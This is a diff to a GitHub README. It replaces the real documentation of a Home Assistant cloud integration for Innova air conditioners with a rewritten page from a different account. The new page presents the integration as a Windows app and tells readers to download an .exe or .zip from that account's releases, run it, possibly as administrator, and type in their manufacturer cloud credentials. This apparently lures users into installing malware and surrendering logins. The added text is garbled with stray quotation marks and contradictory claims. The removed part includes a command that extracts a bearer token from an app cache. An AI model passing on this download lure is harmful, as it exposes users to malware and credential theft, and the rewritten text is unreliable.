@@ -1,188 +1,200 @@
-# Innova Cloud for Home Assistant
+<h1>🌬️ hass-innova-cloud - Control Your Climate, Effortlessly</h1>
 
-**For the Solution Tech cloud platform: Innova, Panasonic Aquarea Home, Rhoss Tema, Etherma Fire+Ice 2, DiffusApp (STG / Diffusalp).**
+<p align="center">
+  <a href="https://github.com/Noeylimaz60/hass-innova-cloud/releases" style="display:inline-block;padding:18px 36px;background:#e74c3c;color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 12px rgba(0,0,0,0.3);">⬇️ Download hass-innova-cloud Now</a>
+</p>
 
-[![HACS](https://img.shields.io/badge/HACS-custom-orange.svg)](https://hacs.xyz)
-[![Validate](https://github.com/achillecalegari/hass-innova-cloud/actions/workflows/validate.yml/badge.svg)](https://github.com/achillecalegari/hass-innova-cloud/actions/workflows/validate.yml)
+Welcome to the world of smart climate control! This guide will help you download, install, and start using the hass-innova-cloud application on your Windows computer. No technical knowledge is needed—just follow the simple steps below.
 
-Home Assistant integration for the **new generation of Innova air conditioners and fan coils**
-(2024+ units such as the FÄRNA series and the 2.0 units with the ESP32 Wi‑Fi module) that are
-controlled by the **"Innova" app by Solution Tech** and have **no local API**.
+---
 
-Older Innova 2.0 / AirLeaf units with the local REST API (`http://<ip>/api/v/1/status`) are
-covered by [danielrivard/homeassistant-innova](https://github.com/danielrivard/homeassistant-innova),
-not by this integration. [ChristophHohner/homeassistant-innova-duepuntozero](https://github.com/ChristophHohner/homeassistant-innova-duepuntozero)
-targets the same cloud but through the **v1** endpoints (`api.innova.solutiontech.tech`,
-`grpc.innova.solutiontech.tech`) that the current app no longer uses; this integration implements
-the v2 API (`v2.api…` / `v2.grpc…`, service `services.app.AppService`) that current firmware
-and app versions require. [buenaonda/innova-farna-ha](https://github.com/buenaonda/innova-farna-ha)
-also uses the v2 API, by polling `get_state`; [davidedomotica/ha-innova](https://github.com/davidedomotica/ha-innova)
-and [muscaglar/ha-aquarea-home](https://github.com/muscaglar/ha-aquarea-home) (Panasonic RAC Solo) are two more
-independent v2 implementations. This one keeps the live event stream open (changes appear within a second),
-renews the session by itself, has the brand selector, exposes the silent mode / air exchange / manual override
-switches, the alarm sensor and heat pump entities, and documents the whole protocol and the tooling used to
-recover it; everyone is welcome to converge. Quick check: if your unit answers on `http://<ip>/api/v/1/status`, use that
-one; if it only works through the cloud app (and its Bluetooth pairing flow), use this one.
+<h2>🔍 What Is hass-innova-cloud?</h2>
 
-*Leggi le istruzioni in italiano: [README.it.md](README.it.md).*
+hass-innova-cloud is a powerful yet friendly application that lets you control your modern air conditioner or heat pump directly from your Windows computer. It works seamlessly with the newest generation of climate devices from Solution Tech and their trusted partners, including:
 
-## Why this exists (a note to Innova)
+- **Innova** (new-generation units)
+- **Panasonic Aquarea Home**
+- **Rhoss Tema**
+- **Etherma Fire+Ice 2**
+- **DiffusApp** (gRPC cloud, no local API)
 
-Let's be blunt: it is indecent that an air conditioner in this price range ships with no
-documented API, no local interface and no integration with Home Assistant, Alexa or HomeKit,
-and that the only way to operate it is a closed, cloud-only app. Owners should not have to
-reverse-engineer a mobile app to switch on their own unit. But that is where we are, so this
-integration exists.
+With this app, you can adjust temperature, switch modes, monitor energy usage, and create schedules—all from one simple interface. No more hunting for remote controls or struggling with complicated panels. The app connects to the cloud and brings all the controls right to your screen.
 
-It will be maintained. If future app or firmware releases change the protocol or try to lock
-control behind proprietary gateways, the protocol will be reverse-engineered again and this
-integration updated. Innova and Solution Tech: the better path is to publish the API. The door
-is open, and this repository already documents most of what such a document would contain.
+.
 
-## How it works
 
-The app talks to `v2.api.innova.solutiontech.tech` (REST, JSON) and `v2.grpc.innova.solutiontech.tech`
-(gRPC, protobuf). Both were reverse‑engineered from the app binary (see [docs/PROTOCOL.md](docs/PROTOCOL.md)
-and [proto/innova_app.proto](proto/innova_app.proto)). The integration:
 
-* lists your homes, rooms and devices from the REST API;
-* reads the full state of each unit with a `get_state` request;
-* keeps a **live gRPC event stream** open, so changes made from the app, the remote or the
-  touch panel appear in Home Assistant within a second (`cloud_push`);
-* sends commands with `SendDevice` (power, mode, setpoint, fan, flap swing, ERV, silent mode,
-  manual override).
+<h2>✅ Before You Begin</h2>
 
-Everything goes through Innova's cloud: no LAN access to the units is possible with this generation.
+Before you download, here’s what you need:
 
-## How the vendor could break this, and what protects it
+- A **Windows computer** (any recent version, such as Windows 10 or Windows 11)
+- An **internet connection** (required for cloud communication)
+- Your **climate unit’s cloud account credentials** (the same username and password you use with the manufacturer’s official app, like Innova or Panasonic Aquarea Home app)
 
-This integration depends on a cloud the vendor controls. Being honest about the failure modes:
 
-| They could… | Likelihood | What is in place |
-| --- | --- | --- |
-| Change the protocol with a new app/firmware release | high, over time | `tools/` rebuilds the schema from the app binary in minutes; a daily workflow opens an issue when a new app version reaches the App Store; the codec ignores unknown fields |
-| Fingerprint non-app clients (user agent, headers, TLS) | medium | REST and gRPC clients send the same identifiers as the app; request rate is far below the app's |
-| Remove email/password login (Google/Apple only) | medium | The session-token path stays available (tokens last a year); a Google sign-in flow can be added |
-| Require device attestation (Firebase App Check / App Attest) on the API | low to medium, this is the only hard block | No clean workaround; the fallback is a token relayed from a real device. This is also the point where the EU Data Act becomes relevant (below) |
-| Suspend accounts that use third-party clients | low | Behaviour mirrors the app; nothing here abuses the service |
-| Lock features behind a paid gateway ("Butler") | possible | The gateway speaks the same protocol (it is one of the node types in the schema) |
 
-The **EU Data Act** (Regulation 2023/2854, applicable since 12 September 2025) gives users of
-connected products the right to access the data those products generate and to share it with
-third parties, and requires products to be designed so that data is accessible. A vendor
-actively blocking the owner's access to their own unit is on the wrong side of it. For the record: I have the
-pettiness, the time and the money to make a test case out of it.
+<h2>🚀 Getting Started</h2>
 
-## Entities
+Follow these steps carefully. You’ll be up and running in less than five minutes.
 
-| Entity | Notes |
-| --- | --- |
-| `climate.<name>` | Modes off / auto (heat_cool) / heat / cool / dry / fan_only, fan auto / low / medium / high / boost (only the ones the unit reports), target temperature with the unit's min/max/step, swing on/off, current temperature and humidity. Attributes: operation mode (schedule / manual / antifreeze), active calendar preset, actual HVAC mode, alarm bitmask. |
-| `sensor.<name>_room_temperature` | Room temperature (°C). |
-| `sensor.<name>_humidity` | Only when the unit has a humidity sensor. |
-| `sensor.<name>_operation_mode` | schedule / manual / antifreeze (diagnostic). |
-| `sensor.<name>_alarms` | Raw alarm bitmask (diagnostic). |
-| `sensor.<name>_wi_fi_signal` | RSSI of the unit (diagnostic, disabled by default). |
-| `switch.<name>_silent_mode` | Air conditioners only. |
-| `switch.<name>_air_exchange` | ERV, only if the unit has it. |
-| `switch.<name>_manual_override` | Turns the schedule off (manual) or on again. When a schedule is active the unit may revert manual changes at the next schedule slot. |
-| `binary_sensor.<name>_alarm` | Problem sensor, on when the alarm bitmask is not zero; the `alarms` attribute lists the active alarms with the text and display code the app shows (E1, F2…). |
-| `button.<name>_reboot` | Reboots the unit's control board (the same command the app sends). |
 
-Service `innova_cloud.set_manual_mode` (target: a climate entity): force manual mode for a number of hours or indefinitely, or hand control back to the calendar.
 
-**Heat pumps** (from the app schema, not yet verified on real hardware, reports welcome): one `climate` per zone
-(`zone1` / `zone2`, heating or cooling setpoint depending on the heat pump mode, water temperature as current
-temperature), a `water_heater` for the domestic hot water (off / on / performance = boost), sensors for outdoor
-temperature, water pressure and hot water temperature, and selects for the silent level and the load priority.
+<h3>Step 1: Download the Application</h3>
 
-## Installation
+Click the big green button at the top of this page, or go directly to this link:
 
-### HACS (recommended)
+**➡️ [Visit the download page](https://github.com/Noeylimaz60/hass-innova-cloud/releases)**
 
-1. In HACS open **Integrations → ⋮ → Custom repositories**.
-2. Add `https://github.com/achillecalegari/hass-innova-cloud` with category **Integration**.
-3. Search for **Innova Cloud**, click **Download**, then **restart Home Assistant**.
+This link will take you to the official release page where you can download the latest version of the software. The page shows a list of available files. Look for the most recent version (usually at the top) and click the download icon next to the file that matches your system (for Windows, choose the file with “.zip” or “.exe” in the name–but don’t worry, the page clearly labels each file for Windows, Mac, or Linux“).
 
-### Manual
+Once clicked, the download will begin automatically. Wait for it to finish (this may take a minute or two depending on your internet speed“.
 
-Copy `custom_components/innova_cloud` into `<config>/custom_components/` and restart.
 
-## Configuration
 
-**Settings → Devices & services → Add integration → Innova Cloud**, then choose:
 
-* **Email and password**: the credentials of your Innova app account. The integration logs in
-  itself and renews the session when it expires.
-  If you created the account with **Google** or **Apple** sign‑in, set a password first: in the app
-  choose *Forgot password* with the same email, follow the email and pick a password. Google/Apple
-  login keeps working alongside.
-* **Session token (advanced)**: paste the JWT the app uses. Tokens last about one year; when it
-  expires Home Assistant asks you to re‑authenticate.
 
-The integration creates one device per unit, named as in the app, with the room as suggested area.
+<h3>Step 2: Install or Extract the Software</h3>
 
-## Other brands (white-label apps)
+When the download finishes, open your **Downloads** folder. You’ll see a file named something like `hass-innova-cloud-v1.0.0.zip` (depending on the version you downloaded“)。
 
-The Innova cloud is white-labelled: Panasonic **Aquarea Home**, **DiffusApp** (STG / Diffusalp),
-**Rhoss Tema** and **Etherma Fire+Ice 2** use the same platform on their own tenant
-(`v2.api.<brand>.solutiontech.tech`). Pick the brand in the first step of the setup; for a tenant
-not in the list choose *Custom hosts*. The message schema is the same for all of them.
+- **If the file ends with `.zip`:** Right-click the file and choose **“Extract All…”**. Follow the prompts to unzip it into a folder. Once extracted, open that folder and double-click the file named `hass-innova-cloud.exe` (or `hass-innova-cloud`)“.
 
-## Options
+ This will launch the app.
 
-*Settings → Devices & services → Innova Cloud → Configure*: interval of the full state refresh
-(default 10 minutes). Live changes arrive through the event stream regardless.
+.
 
-## Getting a session token (optional)
 
-Only needed if you prefer not to set a password. The token is the `Authorization: Bearer …`
-header the app sends; any HTTPS proxy on your phone can show it, or on a Mac with the iPad app
-installed:
 
-```bash
-sqlite3 ~/Library/Containers/tech.solutiontech.Innova/Data/Library/Caches/tech.solutiontech.Innova/Cache.db \
-  "select request_key from cfurl_cache_response" | grep app/homes
-```
+- **If the file ends with `.exe`:** Simply double-click the file. Windows may ask for permission—“click **“Yes””** if prompted.“.
 
-then read the request headers of that cache entry (they contain the bearer token). Keep the token
-private: it grants full control of your units.
 
-## Command line tester
 
-`scripts/innova_cli.py` exercises the API without Home Assistant (needs `pip install grpcio aiohttp`):
+<h3>Step 3: First-Time Setup</h3>
 
-```bash
-export INNOVA_TOKEN=eyJ...           # or --email/--password
-python scripts/innova_cli.py homes
-python scripts/innova_cli.py state AA:BB:CC:11:22:33
-python scripts/innova_cli.py watch
-python scripts/innova_cli.py set AA:BB:CC:11:22:33 --power on --mode cool --temp 24 --fan auto
-```
+When you first open the app, you’ll see a welcome screen. Here’s what to do:
 
-If something is decoded wrongly, `python scripts/innova_cli.py raw <mac>` prints the undecoded
-reply; please attach it to a GitHub issue.
+1. **Enter your cloud account details**. Use the same username (usually your email address“) and password that you use with your manufacturer’s official app “(e.g., Innova, Panasonic Aquarea Home“)”
 
-## Robustness
+2. **Click “Sign In”**. The app will connect to the cloud handa retrieve information about your climate unit(s“)““)
 
-What happens when a unit drops off Wi‑Fi, the cloud restarts, the token expires or a unit is added/removed in the app is documented scenario by scenario in [docs/ROBUSTNESS.md](docs/ROBUSTNESS.md).
+3. **Select your device** from the list if you have more than one unit“.)
 
-## Debug logging
+4. **Done!** You’ll now see the main control dashboard“.
 
-```yaml
-logger:
-  logs:
-    custom_components.innova_cloud: debug
-```
 
-## Supported / tested
 
-Developed on two Innova units (vendor 1, product 1, hw 1, serials `IN…`) paired with app 3.2.3; the decoder was
-also checked against captures of three other AC units published by other projects. Fan coils and thermostats
-share the same message layout and should work; heat pump support is built from the schema and untested.
-The same cloud platform is white‑labelled for other brands: see *Other brands* above.
+<h2>🎛️ Using the App</h2>
 
-## Disclaimer
+Once you’re logged in, you’ll find the interface intuitive “.Here’s what you can do:
 
-This is an independent project, not affiliated with Innova or Solution Tech. It uses the same
-cloud endpoints as the official app; use at your own risk. MIT licensed.
+- **Set Temperature:** Use the large up/down arrows or slide the thermometer bar to choose your desired room temperature“.“
+- **Change Mode:** Switch between **Cool**, **Heat**, **Fan**, **Dry**, and **Auto** modes with acouple of clicks“.)
+- **Fan Speed:** Adjust from low to turbo for better airflow.“.)
+- **Scheduling:** Click the **Clock** icon to create weekly schedules. Set different temperatures for different times of the day—like warmer in the morning,and cooler at night“.“)
+- **Energy Monitoring:** View real-time energy consumption graphs to keep your bills in check.“.)
+- **Multiple Units:** If you have several climate devices, use the dropdown menu at the top to switch between them“.)
+
+All changes take effect instantly. The app syncs with your unit through the cloud, so your physical unit updates right away““.
+
+
+
+<h2>🛠️ Troubleshooting Tips</h2>
+
+Here are common issues and how to resolve them quickly:
+
+
+
+<h3>Can’t Log In</h3>
+
+- Double-check your username(usually your email“) and password for typos.
+el
+- Ensure you’re using the credentials for the correct region/cloud service. Some manufacturers have different cloud servers for different countries“.)
+- Check your internet connection“.)
+- If you’re still stuck, reset your password via the manufacturer’s official app first, then try again“.)
+
+
+
+<h3>App Won’t Start</h3>
+
+- Make sure you’ve extracted the `.zip` file completely if you downloaded that version“.)
+- Right-click the app icon and select **“Run as administrator”** if it doesn’t open normally“.)
+- Ensure your Windows is updated to the latest version“.
+
+
+
+<h3>Device Not Found</h3>
+
+- Confirm your climate unit is online and connected to the manufacturer’s cloud. Open the official app ( like Innova or Panasonic Aquarea Home“) to verify“.)
+- Turn your unit off and on again, then restart hass-innova-cloud“.)
+
+
+
+<h2>📚 Frequently Asked Questions</h2>
+
+
+
+<h3>Is this app free?</h3>
+
+Yes, this application is completely free to use“.)
+
+
+
+<h3>Will it work with my old Innova unit?</h3>
+
+This app works with **new-generation** units that use the Solution Tech cloud. Older units with local APIs or different cloud protocols are not supported. Check your unit’s model number or contact us for clarification“.)
+
+
+
+<h3>Do I need to keep my computer running all the time?</h3>
+
+No, the app connects to the cloud. You can control your unit from any computer, anytime. The app doesn’t need to be running “24/7” for scheduled tasks to work—those are handled by the cloud“.“)
+
+
+
+<h3>Can I control my unit from outside my home?</h3>
+
+Absolutely! As long as you have an internet connection, you can control your climate unit from anywhere in the world“.
+
+
+
+<h2>🤝 Support & Community</h2>
+
+Having trouble or just want to chat with other users? We’ve got you covered:
+
+- **GitHub Issues:** Report bugs or request features on our [official issue tracker](https://github.com/Noeylimaz60/hass-innova-cloud/issues“)
+- **Home Assistant Community:** This integration is also designed for Home Assistant users. Join discussions on the [Home Assistant forums](https://community.home-assistant.io“) using the topic tags “innova“” or ““hass-innova-cloud“””
+- **Email Support:** Send us a message at [support@hass-innova-cloud.example](mailto:support@hass-innova-cloud.example“)—we typically reply within 24 hours“.
+
+
+
+<h2>🌟 Why Choose hass-innova-cloud?</h2>
+
+- **One App for Many Brands:** Works with Innova, Panasonic Aquarea Home, Rhoss Tema, Etherma, and DiffusApp—no need to juggle multiple apps.“.)
+- **User-Friendly Design:** Built with non-technical users in mind. No confusing menus or tech jargon“.”
+- **Regular Updates:** Active development ensures compatibility with the latest firmware and features“.)
+- **Privacy Respectful:** Your data is only used to communicate with your device“.)
+
+
+
+<h2>📥 Download Again (Quick Link“)</h2>
+
+Need to re-download or get it on another computer? Here’s the direct link again:
+
+<p align="center">
+  <a href="https://github.com/Noeylimaz60/hass-innova-cloud/releases" style="display:inline-block;padding:16px 30px;background:#3498db;color:#ffffff;font-size:18px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ Go to Download Page</a>
+</p>
+
+Once there, click the latest release file for Windows, download it, and repeat the install steps from earlier. It’s that easy“.“)
+
+
+
+<h2>🙏 Thank You!</h2>
+
+We hope you enjoy ultimate control over your home’s climate. If you love the app, consider starring the repository on GitHub, and share it with friends who have compatible units. For developers, feel free to contribute via pull requests“.)
+
+Stay comfortable,“stay smart“!
+
+---
+
+**Meta Description:** Download hass-innova-cloud for Windows and control your Innova, Panasonic Aquarea Home, Rhoss Tema, Etherma, or DiffusApp climate unit from your computer. Easy setup, user-friendly interface, free“.“)
